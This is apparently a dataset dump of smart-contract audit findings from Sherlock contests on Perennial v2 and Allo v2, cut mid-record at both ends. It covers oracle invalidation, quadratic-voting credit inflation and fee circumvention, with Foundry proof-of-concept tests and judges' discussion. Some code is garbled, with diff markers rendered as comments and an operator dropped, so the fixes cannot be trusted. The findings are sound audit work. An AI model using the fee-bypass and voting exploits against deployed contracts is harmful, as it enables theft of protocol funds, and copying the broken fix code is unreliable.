incorrectly (Market issue with this was reported separately as it's completely different), so both should be fixed and the fix of this one will depend on how the `Market` bug is fixed. The way it is, `MultiInvoker` correctly adjusts pending position before invalidating `latestPosition` (which `Market` fails to do), however after such action `pendingPosition` must not be adjusted, because it was already adjusted and new adjustment should only change it by the difference from the last invalidation. The easier solution would be just not to change `latestPosition` in case of invalid oracle version, so the fix might be like this (just add else):\n```\n    if (!oracleVersion.valid) latestPosition.invalidate(pendingPosition);\n    else latestPosition.update(pendingPosition);\n```\n\nHowever, if the `Market` bug is fixed the way I proposed it (by changing `invalidate` function to take into account difference in invalidation of `latestPosition` and pendingPosition), then this fix will still be incorrect, because `invalidate` will expect unadjusted `pendingPosition`, so in this case `pendingPosition` should not be adjusted after loading it, but it will have to be adjusted for positions not yet settled. So the fix might look like this:\n```\n    Position memory pendingPosition = market.pendingPositions(account, id);\n-   pendingPosition.adjust(latestPosition);\n\n    // load oracle version for that position\n    OracleVersion memory oracleVersion = market.oracle().at(pendingPosition.timestamp);\n    if (address(payoff) != address(0)) oracleVersion.price = payoff.payoff(oracleVersion.price);\n\n    // virtual settlement\n    if (pendingPosition.timestamp <= latestTimestamp) {\n        if (!oracleVersion.valid) latestPosition.invalidate(pendingPosition);\n-        latestPosition.update(pendingPosition);\n+       else {\n+           pendingPosition.adjust(latestPosition);\n+           latestPosition.update(pendingPosition);\n+       }\n        if (oracleVersion.valid) latestPrice = oracleVersion.price;\n\n        previousMagnitude = latestPosition.magnitude();\n        closableAmount = previousMagnitude;\n\n    // process pending positions\n    } else {\n+       pendingPosition.adjust(latestPosition);\n        closableAmount = closableAmount\n            .sub(previousMagnitude.sub(pendingPosition.magnitude().min(previousMagnitude)));\n        previousMagnitude = latestPosition.magnitude();\n    }\n```\n\nDiscussion\nsherlock-admin\n1 comment(s) were left on this issue during the judging contest.\npolarzero commented:\nMedium. Perfectly explained and demonstrated in the report.\narjun-io\nFixed: https://github.com/equilibria-xyz/perennial-v2/pull/103\npanprog\nFixedчIf there is an invalid oracle version during pending position settlement in `MultiInvoker` liquidation action, it will incorrectly revert and will cause loss of funds for the liquidator who should have received liquidation fee, but reverts instead.\nSince this breaks important `MultiInvoker` functionality in some rare edge cases (invalid oracle version, user has unsettled position which should settle during user liquidation with `LIQUIDATION` action of MultiInvoker), this should be a valid medium finding.\nCode Snippet\nTool used\nManual Review
Invalid oracle version can cause the vault to open too large and risky position and get liquidated due to using unadjusted global current positionчmediumч```\ncontext.currentPosition = registration.market.pendingPosition(global.currentId);\n```\nч`StrategyLib._loadContext` for the market loads `currentPosition` as:\n```\ncontext.currentPosition = registration.market.pendingPosition(global.currentId);\n```\n\nHowever, this is unadjusted position, so its value is incorrect if invalid oracle version happens while this position is pending.\nLater on, when calculating minimum and maxmium positions enforced by the vault in the market, they're calculated in _positionLimit:\n```\nfunction _positionLimit(MarketContext memory context) private pure returns (UFixed6, UFixed6) {\n    return (\n        // minimum position size before crossing the net position\n        context.currentAccountPosition.maker.sub(\n            context.currentPosition.maker\n                .sub(context.currentPosition.net().min(context.currentPosition.maker))\n                .min(context.currentAccountPosition.maker)\n                .min(context.closable)\n        ),\n        // maximum position size before crossing the maker limit\n        context.currentAccountPosition.maker.add(\n            context.riskParameter.makerLimit\n                .sub(context.currentPosition.maker.min(context.riskParameter.makerLimit))\n        )\n    );\n}\n```\n\nAnd the target maker size for the market is set in allocate:\n```\n(targets[marketId].collateral, targets[marketId].position) = (\n    Fixed6Lib.from(_locals.marketCollateral).sub(contexts[marketId].local.collateral),\n    _locals.marketAssets\n        .muldiv(registrations[marketId].leverage, contexts[marketId].latestPrice.abs())\n        .min(_locals.maxPosition)\n        .max(_locals.minPosition)\n);\n```\n\nSince `context.currentPosition` is incorrect, it can happen that both `_locals.minPosition` and `_locals.maxPosition` are too high, the vault will open too large and risky position, breaking its risk limit and possibly getting liquidated, especially if it happens during high volatility.чAdjust global current position after loading it:\n```\n    context.currentPosition = registration.market.pendingPosition(global.currentId);\n+   context.currentPosition.adjust(registration.market.position());\n```\n\nDiscussion\nkbrizzle\nFixed in: https://github.com/equilibria-xyz/perennial-v2/pull/109.\nPlease note there were additional pending positions that required adjustment.\npanprog\nFixedчIf invalid oracle version happens, the vault might open too large and risky position in such market, potentially getting liquidated and vault users losing funds due to this liquidation.\nCode Snippet\nTool used\nManual Review
`QVSimpleStrategy` never updates `allocator.voiceCredits`.чhighч```\n    function _allocate(bytes memory _data, address _sender) internal virtual override {\n        …\n\n        // check that the recipient has voice credits left to allocate\n        if (!_hasVoiceCreditsLeft(voiceCreditsToAllocate, allocator.voiceCredits)) revert INVALID();\n\n        _qv_allocate(allocator, recipient, recipientId, voiceCreditsToAllocate, _sender);\n    }\n```\nч```\n    function _allocate(bytes memory _data, address _sender) internal virtual override {\n        …\n\n        // check that the recipient has voice credits left to allocate\n        if (!_hasVoiceCreditsLeft(voiceCreditsToAllocate, allocator.voiceCredits)) revert INVALID();\n\n        _qv_allocate(allocator, recipient, recipientId, voiceCreditsToAllocate, _sender);\n    }\n```\n\n```\n    function _hasVoiceCreditsLeft(uint256 _voiceCreditsToAllocate, uint256 _allocatedVoiceCredits)\n        internal\n        view\n        override\n        returns (bool)\n    {\n        return _voiceCreditsToAllocate + _allocatedVoiceCredits <= maxVoiceCreditsPerAllocator;\n    }\n```\n\nThe problem is that `allocator.voiceCredits` is always zero. Both `QVSimpleStrategy` and `QVBaseStrategy` don't update `allocator.voiceCredits`. Thus, allocators can cast more votes than `maxVoiceCreditsPerAllocator`.ч
`recipientsCounter` should start from 1 in `DonationVotingMerkleDistributionBaseStrategy`чhighч```\n    function _registerRecipient(bytes memory _data, address _sender)\n        internal\n        override\n        onlyActiveRegistration\n        returns (address recipientId)\n    {\n        …\n\n        uint8 currentStatus = _getUintRecipientStatus(recipientId);\n\n        if (currentStatus == uint8(Status.None)) {\n            // recipient registering new application\n            recipientToStatusIndexes[recipientId] = recipientsCounter;\n            _setRecipientStatus(recipientId, uint8(Status.Pending));\n\n            bytes memory extendedData = abi.encode(_data, recipientsCounter);\n            emit Registered(recipientId, extendedData, _sender);\n\n            recipientsCounter++;\n        } else {\n            if (currentStatus == uint8(Status.Accepted)) {\n                // recipient updating accepted application\n                _setRecipientStatus(recipientId, uint8(Status.Pending));\n            } else if (currentStatus == uint8(Status.Rejected)) {\n                // recipient updating rejected application\n                _setRecipientStatus(recipientId, uint8(Status.Appealed));\n            }\n            emit UpdatedRegistration(recipientId, _data, _sender, _getUintRecipientStatus(recipientId));\n        }\n    }\n```\nч```\n    function _registerRecipient(bytes memory _data, address _sender)\n        internal\n        override\n        onlyActiveRegistration\n        returns (address recipientId)\n    {\n        …\n\n        uint8 currentStatus = _getUintRecipientStatus(recipientId);\n\n        if (currentStatus == uint8(Status.None)) {\n            // recipient registering new application\n            recipientToStatusIndexes[recipientId] = recipientsCounter;\n            _setRecipientStatus(recipientId, uint8(Status.Pending));\n\n            bytes memory extendedData = abi.encode(_data, recipientsCounter);\n            emit Registered(recipientId, extendedData, _sender);\n\n            recipientsCounter++;\n        } else {\n            if (currentStatus == uint8(Status.Accepted)) {\n                // recipient updating accepted application\n                _setRecipientStatus(recipientId, uint8(Status.Pending));\n            } else if (currentStatus == uint8(Status.Rejected)) {\n                // recipient updating rejected application\n                _setRecipientStatus(recipientId, uint8(Status.Appealed));\n            }\n            emit UpdatedRegistration(recipientId, _data, _sender, _getUintRecipientStatus(recipientId));\n        }\n    }\n```\n\n```\n    function _getUintRecipientStatus(address _recipientId) internal view returns (uint8 status) {\n        // Get the column index and current row\n        (, uint256 colIndex, uint256 currentRow) = _getStatusRowColumn(_recipientId);\n\n        // Get the status from the 'currentRow' shifting by the 'colIndex'\n        status = uint8((currentRow  colIndex) & 15);\n\n        // Return the status\n        return status;\n    }\n```\n\n```\n    function _getStatusRowColumn(address _recipientId) internal view returns (uint256, uint256, uint256) {\n        uint256 recipientIndex = recipientToStatusIndexes[_recipientId];\n\n        uint256 rowIndex = recipientIndex / 64; // 256 / 4\n        uint256 colIndex = (recipientIndex % 64) * 4;\n\n        return (rowIndex, colIndex, statusesBitMap[rowIndex]);\n    }\n```\n\n```\n    /// @notice The total number of recipients.\n    uint256 public recipientsCounter;\n```\n\nConsider the following situation:\nAlice is the first recipient calls `registerRecipient`\n```\n// in _registerRecipient\nrecipientToStatusIndexes[Alice] = recipientsCounter = 0;\n_setRecipientStatus(Alice, uint8(Status.Pending));\nrecipientCounter++\n```\n\nBob calls `registerRecipient`.\n```\n// in _getStatusRowColumn\nrecipientToStatusIndexes[Bob] = 0 // It would access the status of Alice\n// in _registerRecipient\ncurrentStatus = _getUintRecipientStatus(recipientId) = Status.Pending\ncurrentStatus != uint8(Status.None) -> no new application is recorded in the pool.\n```\n\nThis implementation error makes the pool can only record the first application.чMake the counter start from 1. There are two methods to fix the issue.\n\n```\n    /// @notice The total number of recipients.\n// Add the line below\n   uint256 public recipientsCounter;\n// Remove the line below\n   uint256 public recipientsCounter;\n```\n\n\n```\n    function _registerRecipient(bytes memory _data, address _sender)\n        internal\n        override\n        onlyActiveRegistration\n        returns (address recipientId)\n    {\n        …\n\n        uint8 currentStatus = _getUintRecipientStatus(recipientId);\n\n        if (currentStatus == uint8(Status.None)) {\n            // recipient registering new application\n// Add the line below\n           recipientToStatusIndexes[recipientId] = recipientsCounter // Add the line below\n 1;\n// Remove the line below\n           recipientToStatusIndexes[recipientId] = recipientsCounter;\n            _setRecipientStatus(recipientId, uint8(Status.Pending));\n\n            bytes memory extendedData = abi.encode(_data, recipientsCounter);\n            emit Registered(recipientId, extendedData, _sender);\n\n            recipientsCounter// Add the line below\n// Add the line below\n;\n        …\n    }\n```\n\nDiscussion\nAhmadDecoded\nEscalate\nThis should be upgraded to high, breaks the core functionality of protocol, setting wrong status.\nsherlock-admin2\nEscalate\nThis should be upgraded to high, breaks the core functionality of protocol, setting wrong status.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nkadenzipfel\nTo clarify impact, adding to @AhmadDecoded's escalation, since every new recipient after the initial registered recipient will have a `currentStatus != Status.None`, we will continually update the status of the initial recipient, never actually correctly marking any recipient statuses. Since the registration process is used to determine distribution, in the worst case, following the on-chain registration statuses as expected to determine distribution, the pool manager may incorrectly distribute the full poolAmount solely to the initial registered recipient. In the best case, the pool will not be usable and a new one will have to be redeployed, causing the pool manager and any registered recipients to lose a material amount of funds due to gas costs every time a pool is created with this strategy.\nTo summarize, since the impact is either (perhaps unlikely) significant fund loss by believing contract state to be true or (100% likely) less significant gas loss due to the system completely failing every time, this should be classified as high severity.\nneeksec\nAgree with Escalation that this is a high becasue of this impact described by @kadenzipfel,\nin the worst case, following the on-chain registration statuses as expected to determine distribution, the pool manager may incorrectly distribute the full poolAmount solely to the initial registered recipient.\nMLON33\nhttps://github.com/allo-protocol/allo-v2/pull/351\nEvert0x\nPlanning to accept escalation and set severity to high\nEvert0x\nResult: High Has Duplicates\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nahmaddecoded: accepted\njkoppel\nWhy do the duplicates still have the Medium label?\njack-the-pug\nFixed. Note: `recipientsCounter` is now +1 than the actual count of recipients.чCode Snippet\nTool used\nManual Review
`Registry.sol` generate clone `Anchor.sol` never work. Profile owner cannot use their `Anchor` walletчhighч"```\n    function test_Audit_createProfile() public {\n        // create profile\n        bytes32 newProfileId = registry().createProfile(nonce, name, metadata, profile1_owner(), profile1_members());\n        Registry.Profile memory profile = registry().getProfileById(newProfileId);\n        Anchor _anchor = Anchor(payable(profile.anchor));\n\n        console.log(""registry address: %s"", address(registry()));\n        console.log(""anchor address: %s"", profile.anchor);\n        console.log(""anchor.registry: %s"", address(_anchor.registry()));\n\n        emit log_named_bytes32(""profile.id"", profile.id);\n        emit log_named_bytes32(""anchor.profile.id"", _anchor.profileId());\n\n        Anchor _anchor_proxy = Anchor(payable(address( _anchor.registry())));\n        assertEq(address(registry()),address(_anchor.registry()) ,""wrong anchor registry"");\n    }\n```\n"ч"```\n    function test_Audit_createProfile() public {\n        // create profile\n        bytes32 newProfileId = registry().createProfile(nonce, name, metadata, profile1_owner(), profile1_members());\n        Registry.Profile memory profile = registry().getProfileById(newProfileId);\n        Anchor _anchor = Anchor(payable(profile.anchor));\n\n        console.log(""registry address: %s"", address(registry()));\n        console.log(""anchor address: %s"", profile.anchor);\n        console.log(""anchor.registry: %s"", address(_anchor.registry()));\n\n        emit log_named_bytes32(""profile.id"", profile.id);\n        emit log_named_bytes32(""anchor.profile.id"", _anchor.profileId());\n\n        Anchor _anchor_proxy = Anchor(payable(address( _anchor.registry())));\n        assertEq(address(registry()),address(_anchor.registry()) ,""wrong anchor registry"");\n    }\n```\n\n```\n    constructor(bytes32 _profileId) {\n        registry = Registry(msg.sender);//@audit H Registry address here is not Registry. msg.sender is a proxy contract. Create3 deploy 2 contract. one is proxy. other is actual bytecode.\n        profileId = _profileId;\n    }\n```\n\nThis can be seen with Solady comment for proxy contract. `msg.sender` above is middleman proxy contract. Not `Registry` contract. Solady generate 2 contract during CREATE3 operation. One is proxy contract. Second is actual bytecode."чMove `msg.sender` into constructor parameter\nDiscussion\njkoppel\nEscalate.\nThis should be a medium because the error would be detected upon the first use of Anchor, with minimal funds lost. The owner would simply redeploy the Anchor and Registry contracts and call updateRegistry on Allo.\nsherlock-admin2\nEscalate.\nThis should be a medium because the error would be detected upon the first use of Anchor, with minimal funds lost. The owner would simply redeploy the Anchor and Registry contracts and call updateRegistry on Allo.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n0xArz\n@jkoppel This should be a high because execute is not payable and the users will have to send ether to the Anchor which will then get stuck and this doesnt have to be detected upon the first use, many users can create an Anchor and deposit ether and only later call execute. A normal user cant just detect this issue if the execute reverts, he might think that its an error on his side. We dont know how fast this will be fixed, how many users will deposit and how much but its def not minimal loss of funds here.\njkoppel\nI didn't say no funds would get stuck. I just said that little would.\nAhmadDecoded\nAssumption that little funds will be completely arbitrary.\nneeksec\nSuggest to keep high.\nAgree with @0xArz and @AhmadDecoded's comments. The lost amount is not foreseeable and could be high.\nMLON33\nhttps://github.com/allo-protocol/allo-v2/pull/348\nEvert0x\nPlanning to reject escalation and keep issue state as is.\nEvert0x\nResult: High Has Duplicates\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\njkoppel: rejected\njack-the-pug\nFixed.ч`Anchor.execute()` function will not work because `registry` address point to empty proxy contract and not actual `Registry` so all call will revert.\nProfile owner cannot use their wallet `Anchor`. All funds send to this `Anchor` contract will be lost forever.\nCode Snippet\nTool used\nManual Review
`fundPool` does not work with fee-on-transfer tokenчmediumч```\n        _transferAmountFrom(_token, TransferData({from: msg.sender, to: address(_strategy), amount: amountAfterFee}));\n        _strategy.increasePoolAmount(amountAfterFee);\n```\nчIn `_fundPool`, the parameter for `increasePoolAmount` is directly the amount used in the `transferFrom` call.\n```\n        _transferAmountFrom(_token, TransferData({from: msg.sender, to: address(_strategy), amount: amountAfterFee}));\n        _strategy.increasePoolAmount(amountAfterFee);\n```\n\nWhen `_token` is a fee-on-transfer token, the actual amount transferred to `_strategy` will be less than `amountAfterFee`. Therefore, the current approach could lead to a recorded balance that is greater than the actual balance.ч
Exponential Inflation of Voice Credits in Quadratic Voting Strategyчmediumч```\nfunction _qv_allocate(\n        // rest of code\n    ) internal onlyActiveAllocation {\n        // rest of code\n        uint256 creditsCastToRecipient = _allocator.voiceCreditsCastToRecipient[_recipientId];\n        // rest of code\n        // get the total credits and calculate the vote result\n        uint256 totalCredits = _voiceCreditsToAllocate + creditsCastToRecipient;\n        // rest of code\n        //E update allocator mapping voice for this recipient\n        _allocator.voiceCreditsCastToRecipient[_recipientId] += totalCredits; //E @question should be only _voiceCreditsToAllocate\n        // rest of code\n    }\n```\nчIn the given code snippet, we observe a potential issue in the way voice credits are being accumulated for each recipient. The specific lines of code in question are:\n```\nfunction _qv_allocate(\n        // rest of code\n    ) internal onlyActiveAllocation {\n        // rest of code\n        uint256 creditsCastToRecipient = _allocator.voiceCreditsCastToRecipient[_recipientId];\n        // rest of code\n        // get the total credits and calculate the vote result\n        uint256 totalCredits = _voiceCreditsToAllocate + creditsCastToRecipient;\n        // rest of code\n        //E update allocator mapping voice for this recipient\n        _allocator.voiceCreditsCastToRecipient[_recipientId] += totalCredits; //E @question should be only _voiceCreditsToAllocate\n        // rest of code\n    }\n```\n\nWe can see that at the end :\n```\n_allocator.voiceCreditsCastToRecipient[_recipientId] = _allocator.voiceCreditsCastToRecipient[_recipientId] + _voiceCreditsToAllocate +  _allocator.voiceCreditsCastToRecipient[_recipientId];\n```\n\nHere, totalCredits accumulates both the newly allocated voice credits (_voiceCreditsToAllocate) and the credits previously cast to this recipient (creditsCastToRecipient). Later on, this totalCredits is added again to `voiceCreditsCastToRecipient[_recipientId]`, thereby including the previously cast credits once more\nProof of Concept (POC):\nLet's consider a scenario where a user allocates credits in three separate transactions:\nTransaction 1: Allocates 5 credits\ncreditsCastToRecipient initially is 0\ntotalCredits = 5 (5 + 0)\nNew voiceCreditsCastToRecipient[_recipientId] = 5\nTransaction 2: Allocates another 5 credits\ncreditsCastToRecipient now is 5 (from previous transaction)\ntotalCredits = 10 (5 + 5)\nNew voiceCreditsCastToRecipient[_recipientId] = 15 (10 + 5)\nTransaction 3: Allocates another 5 credits\ncreditsCastToRecipient now is 15\ntotalCredits = 20 (5 + 15)\nNew voiceCreditsCastToRecipient[_recipientId] = 35 (20 + 15)\nFrom the above, we can see that the voice credits cast to the recipient are exponentially growing with each transaction instead of linearly increasing by 5 each timeчCode should be modified to only add the new voice credits to the recipient's tally. The modified line of code should look like:\n```\n_allocator.voiceCreditsCastToRecipient[_recipientId] += _voiceCreditsToAllocate;\n```\n\nDiscussion\nMLON33\nhttps://github.com/allo-protocol/allo-v2/pull/338\njack-the-pug\nFixedчExponential increase in the voice credits attributed to a recipient, significantly skewing the results of the voting strategy( if one recipient receive 15 votes in one vote and another one receive 5 votes 3 times, the second one will have 20 votes and the first one 15) Over time, this could allow for manipulation and loss of trust in the voting mechanism and the percentage of amount received by recipients as long as allocations are used to calculate the match amount they will receive from the pool amount.\nCode Snippet\nTool used\nManual Review
RFPSimpleStrategy milestones can be set multiple timesчmediumч```\nif (upcomingMilestone != 0) revert MILESTONES_ALREADY_SET();\n```\nчThe `setMilestones` function in `RFPSimpleStrategy` contract checks if `MILESTONES_ALREADY_SET` or not by `upcomingMilestone` index.\n```\nif (upcomingMilestone != 0) revert MILESTONES_ALREADY_SET();\n```\n\nBut `upcomingMilestone` increases only after distribution, and until this time will always be equal to 0.чFix condition if milestones should only be set once.\n```\nif (milestones.length > 0) revert MILESTONES_ALREADY_SET();\n```\n\nOr allow milestones to be reset while they are not in use.\n```\nif (milestones.length > 0) {\n    if (milestones[0].milestoneStatus != Status.None) revert MILESTONES_ALREADY_IN_USE();\n    delete milestones;\n}\n```\n\nDiscussion\nsherlock-admin2\nEscalate This is invalid. I cannot accept that a pool manager can be malicious\n```\nYou've deleted an escalation for this issue.\n```\n\njkoppel\n#376 explains how this can cause an issue without a malicious pool owner.\nMLON33\nhttps://github.com/allo-protocol/allo-v2/pull/341\njack-the-pug\nFixed.чIt can accidentally break the pool state or be used with malicious intentions.\nTwo managers accidentally set the same milestones. Milestones are duplicated and can't be reset, the pool needs to be recreated.\nThe manager, in cahoots with the recipient, sets milestones one by one, thereby bypassing `totalAmountPercentage` check and increasing the payout amount.\nCode Snippet\nTool used\nManual Review
Allo#_fundPoolчmediumч```\nfunction _fundPool(uint256 _amount, uint256 _poolId, IStrategy _strategy) internal {\n        uint256 feeAmount;\n        uint256 amountAfterFee = _amount;\n\n        Pool storage pool = pools[_poolId];\n        address _token = pool.token;\n\n        if (percentFee > 0) {\n            feeAmount = (_amount * percentFee) / getFeeDenominator();\n            amountAfterFee -= feeAmount;\n\n            _transferAmountFrom(_token, TransferData({from: msg.sender, to: treasury, amount: feeAmount}));\n        }\n\n        _transferAmountFrom(_token, TransferData({from: msg.sender, to: address(_strategy), amount: amountAfterFee}));\n        _strategy.increasePoolAmount(amountAfterFee);\n\n        emit PoolFunded(_poolId, amountAfterFee, feeAmount);\n    }\n```\nчLet's see the code of the `_fundPool` function:\n```\nfunction _fundPool(uint256 _amount, uint256 _poolId, IStrategy _strategy) internal {\n        uint256 feeAmount;\n        uint256 amountAfterFee = _amount;\n\n        Pool storage pool = pools[_poolId];\n        address _token = pool.token;\n\n        if (percentFee > 0) {\n            feeAmount = (_amount * percentFee) / getFeeDenominator();\n            amountAfterFee -= feeAmount;\n\n            _transferAmountFrom(_token, TransferData({from: msg.sender, to: treasury, amount: feeAmount}));\n        }\n\n        _transferAmountFrom(_token, TransferData({from: msg.sender, to: address(_strategy), amount: amountAfterFee}));\n        _strategy.increasePoolAmount(amountAfterFee);\n\n        emit PoolFunded(_poolId, amountAfterFee, feeAmount);\n    }\n```\n\nThe `feeAmount` is calculated as follows:\n```\nfeeAmount = (_amount * percentFee) / getFeeDenominator();\n```\n\nwhere `getFeeDenominator` returns `1e18` and `percentFee` is represented like that: `1e18` = 100%, 1e17 = 10%, 1e16 = 1%, 1e15 = 0.1% (from the comments when declaring the variable).\nLet's say the pool uses a token like GeminiUSD which is a token with 300M+ market cap, so it's widely used, and `percentFee` == 1e15 (0.1%)\nA user could circumvent the fee by depositing a relatively small amount. In our example, he can deposit 9 GeminiUSD. In that case, the calculation will be: `feeAmount = (_amount * percentFee) / getFeeDenominator() = (9e2 * 1e15) / 1e18 = 9e17/1e18 = 9/10 = 0;`\nSo the user ends up paying no fee. There is nothing stopping the user from funding his pool by invoking the `fundPool` with such a small amount as many times as he needs to fund the pool with whatever amount he chooses, circumventing the fee.\nEspecially with the low gas fees on L2s on which the protocol will be deployed, this will be a viable method to fund a pool without paying any fee to the protocol.чAdd a `minFundAmount` variable and check for it when funding a pool.\nDiscussion\nsherlock-admin\n1 comment(s) were left on this issue during the judging contest.\nn33k commented:\nbypassing of fee is an acceptable risk\nnevillehuang\nEscalate\nIn the contest README here:\nFee skirting where pool manager directly fund the pool without paying the fees\nFee bypass is only acceptable for pool managers funding pools, NOT just anybody. Some form of check needs to be implemented to check if `msg.sender` is a pool manager to allow fee skirting (if it even is intentional).\nSidenote: #248, #253, #533, #571, #602, #628, #636, #706 ,#764, #812, #818, #825, #911, #947 are valid duplicates of this issue\nsherlock-admin2\nEscalate\nIn the contest README here:\nFee skirting where pool manager directly fund the pool without paying the fees\nFee bypass is only acceptable for pool managers funding pools, NOT just anybody. Some form of check needs to be implemented to check if `msg.sender` is a pool manager to allow fee skirting (if it even is intentional).\nSidenote: #248, #253, #533, #571, #602, #628, #636, #706 ,#764, #812, #818, #825, #911, #947 are valid duplicates of this issue\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nneeksec\nSuggest to keep the original judging.\nFee skirting where pool manager directly fund the pool without paying the fees\nFee bypass is only acceptable for pool managers funding pools, NOT just anybody.\nIt's acceptable for anybody. If it's not, pool managers can use another EOA to do the fee skirting which easily voids this contest rule.\nnevillehuang\nWhile i respect your point, based on contest READ.ME, only pool managers can bypass fees. Unless it is intended protocol functionality to allow anyone other than pool manager to bypass fees, some sort of check is required. (I.e. minimum fee amount check)\nEvert0x\nPlanning to accept escalation make issue medium together with listed duplicates.\nIt's acceptable for anybody\nIt's clear that it is NOT an acceptable risk for anybody. It's only an acceptable risk for the pool manager role.\nPlease list any known issues/acceptable risks that should not result in a valid finding. Fee skirting where pool manager directly fund the pool without paying the fees\nSays pool manager, not anybody.\nEvert0x\nResult: Medium Has Duplicates\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nnevillehuang: acceptedчThe protocol doesn't collect fees from pools with low decimal tokens.\nCode Snippet\nTool used\nManual Review
`_distribute()` function in RFPSimpleStrategy contract has wrong requirement causing DOSчmediumч```\n    function _distribute(address[] memory, bytes memory, address _sender)\n        internal\n        virtual\n        override\n        onlyInactivePool\n        onlyPoolManager(_sender)\n    {\n        // rest of code\n\n        IAllo.Pool memory pool = allo.getPool(poolId);\n        Milestone storage milestone = milestones[upcomingMilestone];\n        Recipient memory recipient = _recipients[acceptedRecipientId];\n\n        if (recipient.proposalBid > poolAmount) revert NOT_ENOUGH_FUNDS();\n\n        uint256 amount = (recipient.proposalBid * milestone.amountPercentage) / 1e18;\n\n        poolAmount -= amount;//<@@ NOTICE the poolAmount get decrease over time\n\n        _transferAmount(pool.token, recipient.recipientAddress, amount);\n\n        // rest of code\n    }\n```\nчThe function _distribute():\n```\n    function _distribute(address[] memory, bytes memory, address _sender)\n        internal\n        virtual\n        override\n        onlyInactivePool\n        onlyPoolManager(_sender)\n    {\n        // rest of code\n\n        IAllo.Pool memory pool = allo.getPool(poolId);\n        Milestone storage milestone = milestones[upcomingMilestone];\n        Recipient memory recipient = _recipients[acceptedRecipientId];\n\n        if (recipient.proposalBid > poolAmount) revert NOT_ENOUGH_FUNDS();\n\n        uint256 amount = (recipient.proposalBid * milestone.amountPercentage) / 1e18;\n\n        poolAmount -= amount;//<@@ NOTICE the poolAmount get decrease over time\n\n        _transferAmount(pool.token, recipient.recipientAddress, amount);\n\n        // rest of code\n    }\n```\n\nLet's suppose this scenario:\nPool manager funding the contract with 100 token, making `poolAmount` variable equal to 100\nPool manager set 5 equal milestones with 20% each\nSelected recipient's proposal bid is 100, making `recipients[acceptedRecipientId].proposalBid` variable equal to 100\nAfter milestone 1 done, pool manager pays recipient using `distribute()`. Value of variables after: `poolAmount` = 80 ,recipients[acceptedRecipientId].proposalBid = 100\nAfter milestone 2 done, pool manager will get DOS trying to pay recipient using `distribute()` because of this line:\n```\nif (recipient.proposalBid > poolAmount) revert NOT_ENOUGH_FUNDS();\n```\nч
`QVBaseStrategy::reviewRecipients()` doesn't check if the recipient is already accepted or rejected, and overwrites the current statusчmediumч```\n//@audit More managers rejected but the recipient is accepted\n    function test_reviewRecipient_reviewTreshold_OverwriteTheLastOne() public virtual {\n        address recipientId = __register_recipient();\n\n        // Create rejection status\n        address[] memory recipientIds = new address[](1);\n        recipientIds[0] = recipientId;\n        IStrategy.Status[] memory Statuses = new IStrategy.Status[](1);\n        Statuses[0] = IStrategy.Status.Rejected;\n\n        // Reject three times with different managers\n        vm.startPrank(pool_manager1());\n        qvStrategy().reviewRecipients(recipientIds, Statuses);\n\n        vm.startPrank(pool_manager2());\n        qvStrategy().reviewRecipients(recipientIds, Statuses);\n\n        vm.startPrank(pool_manager3());\n        qvStrategy().reviewRecipients(recipientIds, Statuses);\n\n        // Three managers rejected. Status will be rejected.\n        assertEq(uint8(qvStrategy().getRecipientStatus(recipientId)), uint8(IStrategy.Status.Rejected));\n        assertEq(qvStrategy().reviewsByStatus(recipientId, IStrategy.Status.Rejected), 3);\n\n        // Accept two times after three rejections\n        Statuses[0] = IStrategy.Status.Accepted;\n        vm.startPrank(pool_admin());\n        qvStrategy().reviewRecipients(recipientIds, Statuses);\n\n        vm.startPrank(pool_manager4());\n        qvStrategy().reviewRecipients(recipientIds, Statuses);\n\n        // 3 Rejected, 2 Accepted, but status is Accepted because it overwrites right after passing threshold.\n        assertEq(uint8(qvStrategy().getRecipientStatus(recipientId)), uint8(IStrategy.Status.Accepted));\n        assertEq(qvStrategy().reviewsByStatus(recipientId, IStrategy.Status.Rejected), 3);\n        assertEq(qvStrategy().reviewsByStatus(recipientId, IStrategy.Status.Accepted), 2);\n    }\n```\nчIn the QV strategy contracts, recipients register themselves and wait for a pool manager to accept the registration. Pool managers can accept or reject recipients with the `reviewRecipients()` function. There is also a threshold (reviewThreshold) for recipients to be accepted. For example, if the `reviewThreshold` is 2, a pending recipient gets accepted when two managers accept this recipient and the `recipientStatus` is updated.\nHowever, `QVBaseStrategy::reviewRecipients()` function doesn't check the recipient's current status. This one alone may not be an issue because managers may want to change the status of the recipient etc.\nBut on top of that, the function also doesn't take the previous review counts into account when updating the status, and overwrites the status immediately after reaching the threshold. I'll share a scenario later about this below.\nAs I mentioned above, the function updates the `recipientStatus` immediately after reaching the threshold. Here is a scenario of why this might be an issue.\nExample Scenario\nThe pool has 5 managers and the `reviewThreshold` is 2.\nThe first manager rejects the recipient\nThe second manager accepts the recipient\nThe third manager rejects the recipient. -> `recipientStatus` updated -> `status = REJECTED`\nThe fourth manager rejects the recipient -> status still `REJECTED`\nThe last manager accepts the recipient ->recipientStatus updated again -> `status = ACCEPTED`\n3 managers rejected and 2 managers accepted the recipient but the recipient status is overwritten without checking the recipient's previous status and is ACCEPTED now.\nCoded PoC\n```\n//@audit More managers rejected but the recipient is accepted\n    function test_reviewRecipient_reviewTreshold_OverwriteTheLastOne() public virtual {\n        address recipientId = __register_recipient();\n\n        // Create rejection status\n        address[] memory recipientIds = new address[](1);\n        recipientIds[0] = recipientId;\n        IStrategy.Status[] memory Statuses = new IStrategy.Status[](1);\n        Statuses[0] = IStrategy.Status.Rejected;\n\n        // Reject three times with different managers\n        vm.startPrank(pool_manager1());\n        qvStrategy().reviewRecipients(recipientIds, Statuses);\n\n        vm.startPrank(pool_manager2());\n        qvStrategy().reviewRecipients(recipientIds, Statuses);\n\n        vm.startPrank(pool_manager3());\n        qvStrategy().reviewRecipients(recipientIds, Statuses);\n\n        // Three managers rejected. Status will be rejected.\n        assertEq(uint8(qvStrategy().getRecipientStatus(recipientId)), uint8(IStrategy.Status.Rejected));\n        assertEq(qvStrategy().reviewsByStatus(recipientId, IStrategy.Status.Rejected), 3);\n\n        // 